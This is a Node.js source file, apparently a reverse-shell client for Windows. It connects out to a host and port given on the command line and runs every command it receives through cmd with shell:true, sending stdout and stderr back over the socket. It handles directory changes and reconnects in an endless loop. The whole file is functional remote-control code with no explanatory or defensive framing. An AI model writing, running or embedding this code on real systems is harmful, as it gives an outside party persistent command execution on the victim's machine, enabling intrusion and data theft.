const net = require('net')
const child_process = require('child_process')
const iconv = require('iconv-lite')
const fs = require('fs')
const path = require('path')

const server = net.createServer()

let cwd = 'C:\\'

let [prog, file, HOST, PORT] = process.argv
PORT = parseInt(PORT, 10)

function spawn(executable, args, cwd, onstdout, onstderr) {
    return new Promise((resolve, reject) => {
        try {
            if (cwd !== undefined && !fs.existsSync(cwd)) {
                cwd = undefined
            }
            let proc = child_process.spawn(executable, args, {cwd,shell:true})
            proc.stdout.on('data', onstdout)
            proc.stderr.on('data', onstderr)
            proc.on('close', resolve)
        } catch (e) {
            onstderr(e.message)
        }
    })
}

function space_split(text) {
    var res = []
    var item = ''
    var in_str = false
    for(var c of text) {
        if (c == '"') {
            in_str = !in_str
            if (!in_str) {
                res.push(item)
                item = ''
            } else {
                
            }
        } else if (c == ' ') {
            if (in_str) {
                item = item + c
            } else {
                res.push(item)
                item = ''
            }
        } else {
            item = item + c
        }
    }
    if (item.length > 0) {
        res.push(item)
    }
    return res
}

function space_join(args) {
    var res = args.map(arg => arg.indexOf(' ') > -1 ? `"${arg}"` : arg)
    return res.join(" ")
}

function split_args(command) {
    let [executable, ...args] = space_split(command)
    if (['dir', 'echo', 'set'].indexOf(executable) > -1) {
        args = ["/c", executable + " " + space_join(args)]
        executable = "cmd"
    }
    return [executable, args]
}

function execute() {
    return new Promise((resolve, reject) => {
        var client = new net.Socket()
        client.connect(PORT, HOST, ()=>{
            console.log(`connected to ${HOST} ${PORT}`)
        })
        client.on('data', (data) => {
            let command = data.toString()
            let [executable, args] = split_args(command)
            if (executable == 'cd') {
                let cwd_ = args[0]
                if (!path.isAbsolute(cwd_)) {
                    if (cwd !== undefined) {
                        cwd_ = path.join(cwd, cwd_)
                    }
                } 
                if (fs.existsSync(cwd_) && fs.statSync(cwd_).isDirectory()) {
                    cwd = cwd_
                } else {
                    client.write(`no such directory ${cwd_}\n`)
                }
                executable = 'cmd'
                args = ["/c", "echo %CD%"]
            }
            if (executable == 'exit') {
                return reject()
            }
            //console.log('args', args)

            //let buffers = []

            console.log({executable, args, cwd})

            spawn(executable, args, cwd, (data) => {
                //client.write(iconv.decode(data, 'cp866'))
                //buffers.push(data)
                if (Buffer.isBuffer(data)) {
                    client.write(iconv.decode(data, 'cp866'))
                } else {
                    client.write(data)
                }

            }, (data) => {
                if (Buffer.isBuffer(data)) {
                    client.write(iconv.decode(data, 'cp866'))
                } else {
                    client.write(data)
                }
            }).then(() => {
                //client.end(iconv.decode(Buffer.concat(buffers), 'cp866'))
                client.end()
            })

        })
        client.on('close', () => {
            resolve()
        })
    })
}

console.log('server');

(async () => {
    while (true) {
        await execute()
    }
})()